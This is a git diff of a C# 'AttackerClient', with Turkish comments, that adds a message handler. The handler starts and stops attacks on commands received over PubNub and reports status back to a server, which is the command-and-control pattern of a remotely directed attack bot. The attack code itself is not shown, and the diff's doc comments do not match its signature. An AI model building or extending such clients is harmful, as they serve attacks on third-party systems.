@@ -34,7 +34,7 @@ namespace AttackerClient
             Listener listener = new Listener(pubnub);
             listener.AddListener(message =>
             {
-                ClientController.HandleMessage(message, pubnub, SenderId, ref Status, ref Data);
+                HandleMessage(message, pubnub, SenderId);
                 return true;
             });
 
@@ -52,14 +52,49 @@ namespace AttackerClient
             ClientController.PublishStatusMessage(pubnub, SenderId, ref Status, ref Data);
         }
 
-        private void StartAttack()
+        /// <summary>
+        /// Gönderilen mesajı yorumlar ve gereken işlemi başlatır
+        /// </summary>
+        /// <param name="message"></param>
+        /// <param name="pubnub"></param>
+        /// <param name="SenderId"></param>
+        /// <param name="Status"></param>
+        /// <param name="Data"></param>
+        public static void HandleMessage(MessageDTO message, Pubnub pubnub, string SenderId)
         {
-            if(trdAttack == null)
-            {
+            /*
+             Eğer client tarafından karşılanan bir mesaj ise bu değer true yapılır
+             */
+            bool isHandled = false;
 
+            switch (message.MessageType)
+            {
+                case MessageType.TextToClients:
+                    ClientController.WriteMessage(message.Data);
+                    isHandled = true;
+                    break;
+                case MessageType.StartAttack:
+                    ClientController.StartAttack(ref Status, ref Data, message.Data, (ex) =>
+                    {
+                        Status = ClientStatusType.Error;
+                        Data = ex.Message;
+                        return false;
+                    });
+                    isHandled = true;
+                    break;
+                case MessageType.StopAttack:
+                    ClientController.StopAttack(ref Status, ref Data);
+                    isHandled = true;
+                    break;
+                default:
+                    break;
             }
 
-            trdAttack.Start();
+            //Eğer mesaj handle edildiyse son durum server ile paylaşılıyor
+            if (isHandled)
+            {
+                ClientController.PublishStatusMessage(pubnub, SenderId, ref Status, ref Data);
+            }
         }
 
 
